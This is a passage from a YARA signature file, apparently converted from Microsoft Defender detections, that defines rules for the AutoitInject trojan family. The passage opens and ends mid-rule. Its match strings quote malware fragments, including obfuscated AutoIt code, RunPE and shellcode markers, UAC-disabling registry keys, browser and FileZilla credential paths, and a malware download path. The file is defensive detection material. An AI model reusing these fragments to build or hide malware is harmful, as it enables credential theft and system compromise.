        $x_1_3 = "CHR ( 554 + -501 ) & CHR ( 554 + -501 ) & CHR ( 557 + -501 ) & CHR ( 599 + -501 ) & CHR ( 602 + -501 ) & CHR ( 600 + -501 )" ascii //weight: 1
        $x_1_4 = "CHR ( 554 + -501 ) & CHR ( 555 + -501 ) & CHR ( 557 + -501 ) & CHR ( 599 + -501 ) & CHR ( 556 + -501 ) & CHR ( 554 + -501 )" ascii //weight: 1
        $x_1_5 = "CHR ( 549 + -501 ) & CHR ( 557 + -501 ) & CHR ( 599 + -501 ) & CHR ( 598 + -501 ) & CHR ( 552 + -501 ) & CHR ( 555 + -501 )" ascii //weight: 1
        $x_1_6 = "CHR ( 549 + -501 ) & CHR ( 599 + -501 ) & CHR ( 549 + -501 ) & CHR ( 549 + -501 ) & CHR ( 549 + -501 ) & CHR ( 549 + -501 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_RV_2147792958_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RV!MTB"
        threat_id = "2147792958"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "DIM $PBSEQVVXI [ 2 ] = [ \"YIuFpRjcD.exe\"" ascii //weight: 3
        $x_2_2 = "YEXPNYEPQ ( $PBSEQVVXI [ 0 ]" ascii //weight: 2
        $x_1_3 = "CONSOLEWRITEERROR <> BITXOR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_DDF_2147793124_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.DDF!MTB"
        threat_id = "2147793124"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "17"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DLLCALLADDRESS" ascii //weight: 1
        $x_1_2 = "FILEINSTALL" ascii //weight: 1
        $x_1_3 = "TEMPDIR" ascii //weight: 1
        $x_1_4 = "EXECUTE" ascii //weight: 1
        $x_1_5 = "STRINGREPLACE" ascii //weight: 1
        $x_1_6 = "( 8519 + -8420 )" ascii //weight: 1
        $x_1_7 = "( 8473 + -8420 )" ascii //weight: 1
        $x_1_8 = "( 8475 + -8420 )" ascii //weight: 1
        $x_1_9 = "( 8474 + -8420 )" ascii //weight: 1
        $x_1_10 = "( 8472 + -8420 )" ascii //weight: 1
        $x_1_11 = "( 8522 + -8420 )" ascii //weight: 1
        $x_1_12 = "( 8521 + -8420 )" ascii //weight: 1
        $x_1_13 = "( 8468 + -8420 )" ascii //weight: 1
        $x_1_14 = "( 8518 + -8420 )" ascii //weight: 1
        $x_1_15 = "( 8520 + -8420 )" ascii //weight: 1
        $x_1_16 = "( 8477 + -8420 )" ascii //weight: 1
        $x_1_17 = "( 8476 + -8420 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_DDFG_2147793569_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.DDFG!MTB"
        threat_id = "2147793569"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WINEXISTS" ascii //weight: 1
        $x_1_2 = "SHELLEXECUTE" ascii //weight: 1
        $x_1_3 = "PROCESSEXISTS" ascii //weight: 1
        $x_1_4 = "PROCESSCLOSE" ascii //weight: 1
        $x_1_5 = "53,50,60,58,59,5,60,60,59,3,59,3,59,6,60,53,59,60,55,4,59,59,60,2,59,59" ascii //weight: 1
        $x_1_6 = "REGWRITE" ascii //weight: 1
        $x_1_7 = "ISADMIN" ascii //weight: 1
        $x_1_8 = "BITXOR" ascii //weight: 1
        $x_1_9 = "SLEEP" ascii //weight: 1
        $x_1_10 = "TEMPDIR" ascii //weight: 1
        $x_1_11 = "ISBINARY" ascii //weight: 1
        $x_1_12 = "53,50,59,59,60,58,59,59,59,4,60,60,60,58,60,57,60,54" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_DA_2147795882_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.DA!MTB"
        threat_id = "2147795882"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "18"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DLLCALLADDRESS" ascii //weight: 1
        $x_1_2 = "GUISETSTATE" ascii //weight: 1
        $x_1_3 = "SW_SHOW" ascii //weight: 1
        $x_1_4 = "GUICREATE" ascii //weight: 1
        $x_1_5 = "EXECUTE" ascii //weight: 1
        $x_1_6 = "( 549 + -501 )" ascii //weight: 1
        $x_1_7 = "( 552 + -501 )" ascii //weight: 1
        $x_1_8 = "( 601 + -501 )" ascii //weight: 1
        $x_1_9 = "( 554 + -501 )" ascii //weight: 1
        $x_1_10 = "( 553 + -501 )" ascii //weight: 1
        $x_1_11 = "( 603 + -501 )" ascii //weight: 1
        $x_1_12 = "( 602 + -501 )" ascii //weight: 1
        $x_1_13 = "( 558 + -501 )" ascii //weight: 1
        $x_1_14 = "( 557 + -501 )" ascii //weight: 1
        $x_1_15 = "( 599 + -501 )" ascii //weight: 1
        $x_1_16 = "( 600 + -501 )" ascii //weight: 1
        $x_1_17 = "( 550 + -501 )" ascii //weight: 1
        $x_1_18 = "( 556 + -501 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RT_2147796505_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RT!MTB"
        threat_id = "2147796505"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DLLCALLADDRESS" ascii //weight: 1
        $x_1_2 = "GUISETSTATE" ascii //weight: 1
        $x_1_3 = "EXECUTE" ascii //weight: 1
        $x_1_4 = "615 + -501" ascii //weight: 1
        $x_1_5 = "600 + -501" ascii //weight: 1
        $x_1_6 = "552 + -501" ascii //weight: 1
        $x_1_7 = "556 + -501" ascii //weight: 1
        $x_1_8 = "557 + -501" ascii //weight: 1
        $x_1_9 = "549 + -501" ascii //weight: 1
        $x_1_10 = "599 + -501" ascii //weight: 1
        $x_1_11 = "612 + -501" ascii //weight: 1
        $x_1_12 = "611 + -501" ascii //weight: 1
        $x_1_13 = "602 + -501" ascii //weight: 1
        $x_1_14 = "608 + -501" ascii //weight: 1
        $x_1_15 = "618 + -501" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (14 of ($x*))
}

rule Trojan_Win32_AutoitInject_RW_2147796507_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RW!MTB"
        threat_id = "2147796507"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= DLLSTRUCTGETDATA ( DLLSTRUCTCREATE" ascii //weight: 1
        $x_1_2 = "&= CHR ( DEC ( STRINGLEFT (" ascii //weight: 1
        $x_1_3 = " EXECUTE ( BINARYTOSTRING ( \"0x536C65657028313029\" ) )" ascii //weight: 1
        $x_1_4 = "455845435554452842494E415259544F535452494E47282230783436343934433435343334433446" ascii //weight: 1
        $x_1_5 = "455845435554452842494E415259544F535452494E47282230783436343934433435343434353443" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_MRF_2147808922_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.MRF!MTB"
        threat_id = "2147808922"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXECUTE" ascii //weight: 1
        $x_1_2 = "$VCRYPTKEY" ascii //weight: 1
        $x_1_3 = "FUNC RUNPE" ascii //weight: 1
        $x_1_4 = "$BIN_SHELLCODE &= GDWUXSZCJXJX" ascii //weight: 1
        $x_1_5 = "$EXEPATH" ascii //weight: 1
        $x_1_6 = "$VBS" ascii //weight: 1
        $x_1_7 = "$VBSPATH" ascii //weight: 1
        $x_1_8 = "$URLPATH" ascii //weight: 1
        $x_1_9 = "BINARYTOSTRING" ascii //weight: 1
        $x_1_10 = "$XOR = BITXOR" ascii //weight: 1
        $x_1_11 = "$STARTUPDIR = @USERPROFILEDIR & \"\\MdRes" ascii //weight: 1
        $x_1_12 = "\"RmClient\" , \"klist.exe\"" ascii //weight: 1
        $x_1_13 = "RunPE(@ScriptFullPath" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_MA_2147819022_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.MA!MTB"
        threat_id = "2147819022"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "GUICTRLSETPOS ( 658 , 666 , 187 , 31 , 101 )" ascii //weight: 1
        $x_1_2 = "FILERECYCLEEMPTY ( )" ascii //weight: 1
        $x_1_3 = {53 00 54 00 52 00 49 00 4e 00 47 00 52 00 45 00 47 00 45 00 58 00 50 00 52 00 45 00 50 00 4c 00 41 00 43 00 45 00 20 00 28 00 20 00 22 00 [0-15] 22 00}  //weight: 1, accuracy: Low
        $x_1_4 = {53 54 52 49 4e 47 52 45 47 45 58 50 52 45 50 4c 41 43 45 20 28 20 22 [0-15] 22}  //weight: 1, accuracy: Low
        $x_1_5 = {57 00 49 00 4e 00 4b 00 49 00 4c 00 4c 00 20 00 28 00 20 00 22 00 [0-15] 22 00 20 00 2c 00 20 00 22 00 [0-15] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {57 49 4e 4b 49 4c 4c 20 28 20 22 [0-15] 22 20 2c 20 22 [0-15] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = "INIRENAMESECTION ( " ascii //weight: 1
        $x_1_8 = "FILEDELETE ( " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Trojan_Win32_AutoitInject_MA_2147819022_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.MA!MTB"
        threat_id = "2147819022"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "116"
        strings_accuracy = "High"
    strings:
        $x_50_1 = "NERRUC_YEK" wide //weight: 50
        $x_30_2 = "usa02.info/wp-content/uploads" wide //weight: 30
        $x_30_3 = "sdaolpu/tnetnoc-pw/ofni.20asu" wide //weight: 30
        $x_20_4 = "USER\\Software\\ComCyparisSoftDev" wide //weight: 20
        $x_20_5 = "foSsirapyCmoC\\erawtfoS\\RESU" wide //weight: 20
        $x_1_6 = "UnmapViewOfFile" wide //weight: 1
        $x_1_7 = "HTTPSETUSERAGENT" wide //weight: 1
        $x_1_8 = "TAGNMHDR" wide //weight: 1
        $x_1_9 = "STRINGTRIMRIGHT" wide //weight: 1
        $x_1_10 = "STRINGTRIMLEFT" wide //weight: 1
        $x_1_11 = "STRINGREVERSE" wide //weight: 1
        $x_1_12 = "SW_HIDE" wide //weight: 1
        $x_1_13 = "SHELLEXECUTE" wide //weight: 1
        $x_1_14 = "STRINGREPLACE" wide //weight: 1
        $x_1_15 = "iplogger" wide //weight: 1
        $x_1_16 = "DecryptFileW" wide //weight: 1
        $x_1_17 = "_WINAPI_GETDISKFREESPACEEX" wide //weight: 1
        $x_1_18 = "_WINAPI_CREATEFILEEX" wide //weight: 1
        $x_1_19 = "SBACKUPFILE" wide //weight: 1
        $x_1_20 = "STRINGSTRIPWS" wide //weight: 1
        $x_1_21 = "STRINGMID" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_30_*) and 2 of ($x_20_*) and 16 of ($x_1_*))) or
            ((1 of ($x_50_*) and 1 of ($x_30_*) and 1 of ($x_20_*) and 16 of ($x_1_*))) or
            ((1 of ($x_50_*) and 1 of ($x_30_*) and 2 of ($x_20_*))) or
            ((1 of ($x_50_*) and 2 of ($x_30_*) and 6 of ($x_1_*))) or
            ((1 of ($x_50_*) and 2 of ($x_30_*) and 1 of ($x_20_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_RPK_2147821595_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RPK!MTB"
        threat_id = "2147821595"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateSemaphore" ascii //weight: 1
        $x_1_2 = "GetLastError" ascii //weight: 1
        $x_1_3 = "DISABLEUAC" ascii //weight: 1
        $x_1_4 = "EnableLUA" ascii //weight: 1
        $x_1_5 = "SLEEP ( 500 )" ascii //weight: 1
        $x_1_6 = "_BASE64DECODE" ascii //weight: 1
        $x_1_7 = "CallWindowProc" ascii //weight: 1
        $x_1_8 = "TVqQAAMAAAAEAAAA" ascii //weight: 1
        $x_1_9 = "TEMPDIR" ascii //weight: 1
        $x_1_10 = "FILEOPEN" ascii //weight: 1
        $x_1_11 = "BINARYTOSTRING" ascii //weight: 1
        $x_1_12 = "FILEWRITE" ascii //weight: 1
        $x_1_13 = "SHELLEXECUTE" ascii //weight: 1
        $x_1_14 = "DIRREMOVE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_DC_2147825234_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.DC!MTB"
        threat_id = "2147825234"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SHELLEXECUTE ( @WORKINGDIR & \"\\CxIZWvhst\\WHalVEWxc.exe\" )" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RPV_2147826598_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RPV!MTB"
        threat_id = "2147826598"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pfaOPkAvO.exe" ascii //weight: 1
        $x_1_2 = "SHELLEXECUTE ( @WORKINGDIR" ascii //weight: 1
        $x_1_3 = "FOR $KTJZSPTVAN = 0 TO 1" ascii //weight: 1
        $x_1_4 = "IF STRINGTOBINARY = SLEEP" ascii //weight: 1
        $x_1_5 = "KTJZSPTVAN" ascii //weight: 1
        $x_1_6 = "Nueva carpeta" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_DE_2147828941_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.DE!MTB"
        threat_id = "2147828941"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "pgpxipefmymj.exe" wide //weight: 10
        $x_10_2 = "xjumponafstf.exe" wide //weight: 10
        $x_1_3 = "ShellExecuteW" wide //weight: 1
        $x_1_4 = "DllCall" wide //weight: 1
        $x_1_5 = "WindowSpy.ahk" wide //weight: 1
        $x_1_6 = "AU3_Spy.exe" wide //weight: 1
        $x_1_7 = "IsDebuggerPresent" ascii //weight: 1
        $x_1_8 = "CreateToolhelp32Snapshot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 6 of ($x_1_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_RA_2147839884_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RA!MTB"
        threat_id = "2147839884"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "Stealdonex" ascii //weight: 2
        $x_2_2 = "stealchromer" ascii //weight: 2
        $x_2_3 = "stealoperaer" ascii //weight: 2
        $x_2_4 = "loxoperax" ascii //weight: 2
        $x_2_5 = "loxFFoxer" ascii //weight: 2
        $x_1_6 = "filezilla\\recentservers.xml" ascii //weight: 1
        $x_1_7 = "Google\\Chrome\\User Data\\Default" ascii //weight: 1
        $x_1_8 = "Opera Software\\Opera Stable" ascii //weight: 1
        $x_1_9 = "SharedAccess\\Parameters\\FirewallPolicy" ascii //weight: 1
        $x_1_10 = "CurrentVersion\\Policies\\System" ascii //weight: 1
        $x_1_11 = "ConsentPromptBehaviorAdmin" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RA_2147839884_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RA!MTB"
        threat_id = "2147839884"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FILEINSTALL ( \"C:\\Users\\Administrator\\Desktop\\MMtest\\ASUA.exe\" , @TEMPDIR & \"\\MMtest\\ASUA.exe\" , 1 )" ascii //weight: 1
        $x_1_2 = "FILEINSTALL ( \"C:\\Users\\Administrator\\Desktop\\MMtest\\ATKEX.dll\" , @TEMPDIR & \"\\MMtest\\ATKEX.dll\" , 1 )" ascii //weight: 1
        $x_1_3 = "FILEINSTALL ( \"C:\\Users\\Administrator\\Desktop\\MMtest\\EppManifest.dll\" , @TEMPDIR & \"\\MMtest\\EppManifest.dll\" , 1 )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RM_2147849020_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RM!MTB"
        threat_id = "2147849020"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WINGETCLIENTSIZE ( \"ml98vCEDP\" , \"Nq57fp\" )" ascii //weight: 1
        $x_1_2 = "STRINGRIGHT ( \"EwQpPCvmBB\" , 504 )" ascii //weight: 1
        $x_1_3 = "FILEWRITELINE ( 271 , \"Fpl8oJxYf\" )" ascii //weight: 1
        $x_1_4 = "WINSETTITLE ( \"\" , \"jcbKdYWGE\" , \"1IH2BJl\" )" ascii //weight: 1
        $x_1_5 = "INIWRITESECTION ( \"lWSeV85a\" , \"HQ88\" ," ascii //weight: 1
        $x_1_6 = "STRINGREGEXPREPLACE ( \"PzcWuY3qYH\" , \"HOmRFWRzel\" ," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Trojan_Win32_AutoitInject_RE_2147888160_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RE!MTB"
        threat_id = "2147888160"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {27 a7 1e 6e 01 05 ca 6f 25 67 0c 03 cb c3 65 5a 5d 4b 3e e7 d3 50 21 93 ef 5c fd 8c 0f 33 06 7b}  //weight: 1, accuracy: High
        $x_1_2 = {97 87 3c b4 33 40 9e 6a 97 71 27 c1 e9 4f fd ae 03 4f 4b 82 88 e1 71 ea a1 3d 7f 5a 80 4c 2e f5}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RE_2147888160_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RE!MTB"
        threat_id = "2147888160"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FUNC EJXQUZVOUXNPFKT ( )" ascii //weight: 1
        $x_1_2 = "AUTOITSETOPTION <> BITOR" ascii //weight: 1
        $x_1_3 = "DIM $XLNDESXNP [ 2 ] = [ \"fQoOFhrIo.exe\" ," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RE_2147888160_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RE!MTB"
        threat_id = "2147888160"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "[ 2 ] = [ \"PUmgHoIBc\\PUmgHoIBc.exe\" , \"PUmgHoIBc" ascii //weight: 5
        $x_1_2 = "TCPSEND <> @WINDOWSDIR" ascii //weight: 1
        $x_1_3 = "DRIVEGETDRIVE <> TCPSHUTDOWN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_RPY_2147892876_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RPY!MTB"
        threat_id = "2147892876"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RETURN SHELLEXECUTE ( @WORKINGDIR & CHR (" wide //weight: 1
        $x_1_2 = ".mp3.exe" wide //weight: 1
        $x_1_3 = "BITSHIFT <> RUN" wide //weight: 1
        $x_1_4 = "ASSIGN <> STRINGSPLIT" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_GPA_2147892931_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.GPA!MTB"
        threat_id = "2147892931"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {54 23 05 58 45 20 11 32 54 23 05 58 45 20 11 32 41 55 33 21 45 41 30 36 4d a8 ff 73 24 a7 3c f6 7a 12 f1 67 ac c1 93 e7 6b 43 ca 52 a6 ad 00 00 e1 bb 3a 21 a5 29 e3 ec e7 0b 98 2e 40 bd e1 9a}  //weight: 2, accuracy: High
        $x_2_2 = {64 95 61 e7 b6 4d 74 f8 00 00 e5 1a 58 35 81 34 92 a0 6c ac 25 4b 12 38 cb 35 db 1f 22 fd 40 23 79 e0 20 ce ca ea 1e 0b 89 9f}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RPX_2147893063_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RPX!MTB"
        threat_id = "2147893063"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EXECUTE ( \"Fi\" & \"leRe" wide //weight: 1
        $x_1_2 = "ad(FileO\" & \"pen" wide //weight: 1
        $x_1_3 = "@Tem\" & \"pD\" & \"ir" wide //weight: 1
        $x_1_4 = "& \"\"\\nouses\"\")" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RPX_2147893063_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RPX!MTB"
        threat_id = "2147893063"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RETURN SHELLEXECUTE ( @WORKINGDIR & CHR (" wide //weight: 1
        $x_1_2 = "WHILE DLLCALLBACKGETPTR" wide //weight: 1
        $x_1_3 = "Los prisioneros" wide //weight: 1
        $x_1_4 = ".mp3" wide //weight: 1
        $x_1_5 = "CONTROLHIDE <> ASIN" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "[ 2 ] = [ \"pfaOPkAvO.exe\" , \"" ascii //weight: 3
        $x_1_2 = "DRIVEGETSERIAL" ascii //weight: 1
        $x_1_3 = "FILECREATESHORTCUT" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BITAND <> BITXOR" ascii //weight: 1
        $x_1_2 = "CONTROLSHOW <> BITXOR" ascii //weight: 1
        $x_4_3 = "DIM $STTGTWPDQ [ 2 ] = [ \"QhIcjewKt.exe" ascii //weight: 4
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_RF_2147900181_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.RF!MTB"
        threat_id = "2147900181"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WINGETCLIENTSIZE ( $Y3134KYL , \"TuD3rVEmgfWo\" )" ascii //weight: 1
